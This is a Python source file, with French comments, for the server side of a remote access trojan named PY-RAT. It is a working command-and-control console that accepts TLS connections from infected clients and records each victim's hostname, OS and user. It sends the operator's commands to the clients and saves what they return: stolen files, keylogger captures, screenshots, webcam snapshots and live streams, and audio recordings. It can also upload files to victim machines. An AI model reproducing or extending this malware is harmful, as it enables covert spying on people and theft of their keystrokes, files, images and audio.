# =========================
# Imports principaux
# =========================
import socket
import ssl
import json
import datetime
import base64
from threading import Thread
from rat.utils.logger import setup_logger
from rat.server.sessions import SessionManager
import cv2
import numpy as np

logger = setup_logger()


class SSLServer:
    """
    Serveur principal du RAT :
    - gère les connexions SSL
    - maintient les sessions clients
    - reçoit et traite les réponses (screenshots, logs, webcam, etc.)
    - permet l'envoi de commandes aux clients
    """

    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        # État global du serveur
        self._running = True
        self._server_socket = None

        # Configuration réseau
        self.host = host
        self.port = port
        self.chunk_size = chunk_size

        # Contexte SSL (authentification client obligatoire)
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)

        # Gestion des sessions actives
        self._sessions = SessionManager()

        # Gestion du streaming webcam
        self._latest_frame = None
        self._stream_active = False

    # =========================
    # Arrêt propre du serveur
    # =========================
    def shutdown(self):
        logger.info("Shutdown requested")
        self._running = False
        if self._server_socket:
            self._server_socket.close()

    # =========================
    # Boucle principale serveur
    # =========================
    def connect(self):
        """
        - Initialise le socket serveur
        - Attend les connexions clients
        - Authentifie via SSL
        - Crée une session par client
        - Lance un thread de gestion client
        """

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self._server_socket = sock

        sock.bind((self.host, self.port))
        sock.listen(5)
        sock.settimeout(1)

        print(
            r"""
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣄⡀⠀⠀⠀⠀⠙⢮⣧⠀⡀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣄⣤⣿⠷⠿⠟⣶⠶⠶⠛⠛⠓⢲⡄⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠿⠿⢿⡛⣦⠀⠀⠀⣾⡯⠀⠀⣶⣀⣾⠇⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⠼⣴⣶⣤⣾⡟⠀⠀⠀⠈⠀⠀⢀⣿⡿⣷⡀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠒⠛⠋⠉⠉⠁⠀⠀⠉⠉⠛⠁⠀⠀⠀⢀⣠⠖⢫⠏⡇⢻⠳⠄
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠚⠁⠀⠊⠀⠃⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⠀⣶⢿⣝⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣤⣀⠈⠳⢦⡝⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠈⠙⢶⣾⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⠤⠔⠋⠀⣠⣾⡇⠀⠀⠀⠀⠀⠀⣠⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⣀⣀⣀⣀⣤⣤⣤⣴⣖⣒⣒⣛⣛⣉⣉⣉⣤⡤⠤⠤⠔⠚⠿⠛⣷⡀⠀⢀⣤⢶⣟⠯⠤⠤⠤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠘⢧⣄⠀⠉⠛⠒⠒⠒⠶⡍⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⢬⣉⣙⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠉⠙⠉⠀⠀⠀⠀⠀
        :::::::::  :::   :::     :::::::::  :::::::::  :::::::::
        :::   :::   :::  :::     :::   :::  :::   :::  :::::::::
        :::   :::    ::: :::     :::::::::  :::   :::     :::
        :::::::::     :::::: ::: :::::::    :::::::::     :::
        :::              :::     :::  :::   :::   :::     :::
        :::              :::     :::   :::  :::   :::     :::        
        WELCOME TO PY-RAT!
        TO START WAIT FOR A CLIENT TO CONNECT AND ENTER:
        use <id>
        """
        )

        print("Server listening")
        logger.info("Server listening")

        while self._running:
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                continue

            try:
                # Encapsulation SSL de la connexion
                sconn = self._context.wrap_socket(conn, server_side=True)

                print("Client connected:", addr[0])
                logger.info("Client connected: %s", addr[0])

                # Récupération des infos client initiales
                data = self._recv_message(sconn)
                client_info = json.loads(data)

                logger.info(
                    "New agent: %s | %s | %s | %s",
                    client_info["hostname"],
                    client_info["os"],
                    client_info["user"],
                    client_info["release"],
                )

                # Création de session + thread de gestion client
                session = self._sessions.add_session(sconn, client_info)
                Thread(target=self._handle_client, args=(session,), daemon=True).start()

            except ssl.SSLError:
                print("SSL handshake failed")
                logger.error("SSL handshake failed")

        logger.info("Server stopped")
        sock.close()

    # =========================
    # Envoi message (format length-prefixed)
    # =========================
    def _send_message(self, sock, msg: str):
        """Envoie un message avec taille + contenu (protocole maison)."""
        data = msg.encode()
        size = str(len(data)).encode() + b"\n"
        sock.sendall(size)
        sock.sendall(data)

    # =========================
    # Réception message (length-prefixed)
    # =========================
    def _recv_message(self, sock) -> str | None:
        """
        Lit d'abord la taille du message,
        puis récupère exactement N octets.
        """

        size_data = b""
        while not size_data.endswith(b"\n"):
            chunk = sock.recv(1)
            if not chunk:
                return None
            size_data += chunk

        try:
            size = int(size_data.strip())
        except ValueError:
            return None

        buffer = b""
        while len(buffer) < size:
            chunk = sock.recv(min(self.chunk_size, size - len(buffer)))
            if not chunk:
                return None
            buffer += chunk

        return buffer.decode(errors="ignore")

    # =========================
    # Traitement des réponses DOWNLOAD
    # =========================
    def _save_download(self, response):
        try:
            lines = response.split("\n")

            if lines[0] != "DOWNLOAD":
                print(response)
                return

            if lines[1] != "OK":
                print("\n".join(lines[1:]))
                return

            content = "\n".join(lines[2:])

            filename = "downloaded_file_" + datetime.datetime.now().strftime(
                "%Y%m%d_%H%M%S"
            )

            with open(filename, "w") as f:
                f.write(content)

            print(f"File saved: {filename}")

        except Exception as e:
            print("Download save error:", e)

    # =========================
    # Traitement KEYLOGGER
    # =========================
    def _save_keylog(self, response):
        try:
            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            content = "\n".join(lines[2:])

            if not content:
                print("No keystrokes captured")
                return

            filename = "keylogger_file_" + datetime.datetime.now().strftime(
                "%Y%m%d_%H%M%S"
            )

            with open(filename, "w") as f:
                f.write(content)

            print(f"Keylogger saved: {filename}")

        except Exception as e:
            print("Keylogger save error:", e)

    # =========================
    # Screenshot base64 -> fichier
    # =========================
    def _save_screenshot(self, response):
        import base64

        try:
            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            encoded = "".join(lines[2:])
            image_bytes = base64.b64decode(encoded)

            filename = f"screenshot_{datetime.datetime.now().timestamp()}.png"

            with open(filename, "wb") as f:
                f.write(image_bytes)

            print(f"Screenshot saved: {filename}")

        except Exception as e:
            print("Screenshot save error:", e)

    # =========================
    # Webcam snapshot (image unique)
    # =========================
    def _save_webcam(self, response):
        import base64
        from datetime import datetime

        try:
            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            encoded = "".join(lines[2:])
            image_bytes = base64.b64decode(encoded)

            filename = "webcam_" f"{datetime.now().timestamp()}.jpg"

            with open(filename, "wb") as f:
                f.write(image_bytes)

            print(f"Webcam snapshot saved: {filename}")

        except Exception as e:
            print("Webcam save error:", e)

    # =========================
    # Affichage flux webcam (stream)
    # =========================
    def _display_stream(self, response):
        """
        Décode une frame vidéo et la stocke
        pour affichage dans une fenêtre OpenCV.
        """

        try:
            lines = response.split("\n")

            if len(lines) < 3:
                return

            encoded = "".join(lines[2:]).strip()
            if not encoded:
                return

            image_bytes = base64.b64decode(encoded)

            np_arr = np.frombuffer(image_bytes, dtype=np.uint8)

            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)

            if frame is None:
                return

            # stocke la dernière frame reçue
            self._latest_frame = frame
            self._stream_active = True

        except Exception:
            pass

    # =========================
    # Affichage OpenCV du stream
    # =========================
    def run_stream_display(self):
        while self._running:

            if self._stream_active and self._latest_frame is not None:
                cv2.imshow("Webcam Stream", self._latest_frame)

                if cv2.waitKey(1) & 0xFF == ord("q"):
                    break
            else:
                cv2.waitKey(50)

    # =========================
    # Dispatch des réponses client
    # =========================
    def _handle_response(self, response):
        lines = response.split("\n")
        response_type = lines[0]

        if response_type == "DOWNLOAD":
            self._save_download(response)
        elif response_type == "KEYLOG":
            self._save_keylog(response)
        elif response_type == "SCREENSHOT":
            self._save_screenshot(response)
        elif response_type == "AUDIO":
            self._save_audio(response)
        elif response_type == "UPLOAD":
            print("\n".join(lines))
        elif response_type == "WEBCAM":
            self._save_webcam(response)
        elif response_type == "WEBCAM_STREAM":
            self._display_stream(response)
        else:
            print(response)

        # logging global des événements importants
        if response_type in (
            "SCREENSHOT",
            "DOWNLOAD",
            "KEYLOG",
            "UPLOAD",
            "WEBCAM",
            "WEBCAM_STREAM",
            "FRAME",
        ):
            logger.info("Client responded with %s", response_type)
        else:
            logger.info("Client responded: %s", response)

    # =========================
    # Gestion des sessions
    # =========================
    def _print_sessions(self):
        sessions = self._sessions.list_sessions()

        if not sessions:
            print("No active sessions")
            return

        print("\nID   Hostname        OS        User")

        for s in sessions:
            print(f"{s.id:<4}" f"{s.hostname:<15}" f"{s.os:<10}" f"{s.user}")

    def _handle_use(self, command):
        try:
            parts = command.split()

            if len(parts) != 2:
                print("Usage: use <session_id>")
                return

            session_id = int(parts[1])

        except ValueError:
            print("Invalid session id")
            return

        if self._sessions.set_active(session_id):
            print(f"Switched to session {session_id}")
            logger.info("Active session set to %s", session_id)
        else:
            print("Session not found")

    # =========================
    # Upload helper (client-side packaging)
    # =========================
    def _build_upload_payload(self, local_path, remote_path):
        import base64

        with open(local_path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data).decode()

        return f"{remote_path}\n{encoded}"

    # =========================
    # Envoi de commandes au client actif
    # =========================
    def _send_to_active_session(self, command):

        session = self._sessions.get_active()

        if not session:
            print("No active session. Use 'sessions' then 'use <id>'")
            return

        sock = session.sock

        try:
            # gestion spéciale upload
            if command.startswith("upload "):

                parts = command.split()

                if len(parts) != 3:
                    print("Usage: upload <local_path> <remote_path>")
                    return

                local_path = parts[1]
                remote_path = parts[2]

                payload = self._build_upload_payload(local_path, remote_path)

                full_command = f"upload {payload}"

            else:
                full_command = command

            data = full_command.encode()

            size = str(len(data)).encode() + b"\n"

            sock.sendall(size)
            sock.sendall(data)

            logger.info("Command sent: %s", command)

        except Exception as e:
            print("Send error:", e)

    # =========================
    # Thread client (réception continue)
    # =========================
    def _handle_client(self, session):
        sock = session.sock

        logger.info("Session %s handler started", session.id)

        try:
            while self._running:
                response = self._recv_message(sock)

                if not response:
                    break

                self._handle_response(response)

        except Exception as e:
            logger.error("Session %s error: %s", session.id, e)

        finally:
            logger.info("Session %s disconnected", session.id)
            self._sessions.remove_session(session.id)
            sock.close()

    # =========================
    # Kill session
    # =========================
    def _handle_kill(self, command):
        try:
            parts = command.split()

            if len(parts) != 2:
                print("Usage: kill <session_id>")
                return

            session_id = int(parts[1])

        except ValueError:
            print("Invalid session id")
            return

        session = self._sessions.get_session(session_id)

        if not session:
            print("Session not found")
            return

        sock = session.sock

        try:
            data = b"exit"
            size = str(len(data)).encode() + b"\n"
            sock.sendall(size)
            sock.sendall(data)

        except Exception:
            pass

        try:
            sock.close()
        except Exception:
            pass

        self._sessions.remove_session(session_id)

        print(f"Session {session_id} terminated")
        logger.info("Session %s killed", session_id)

    # =========================
    # CLI principale
    # =========================
    def run_console(self):
        while self._running:
            try:
                command = input("rat > ").strip()
            except EOFError:
                print()
                self.shutdown()
                break

            if not command:
                continue
            if command == "exit":
                self.shutdown()
                break
            if command == "sessions":
                self._print_sessions()
                continue
            if command.startswith("use "):
                self._handle_use(command)
                continue
            if command.startswith("kill"):
                self._handle_kill(command)
                continue

            self._send_to_active_session(command)
            logger.info("Closing client socket")

    # =========================
    # Save audio helper
    # =========================
    def _save_audio(self, response):
        try:
            lines = response.split("\n")

            if lines[1] != "OK":
                print("Audio capture failed:", lines[2])
                return

            encoded = lines[2]
            data = base64.b64decode(encoded)

            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"

            with open(filename, "wb") as f:
                f.write(data)

            print(f"Audio saved: {filename}")

        except Exception as e:
            print("Audio save error:", e)


# =========================
# Thread serveur principal
# =========================
class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
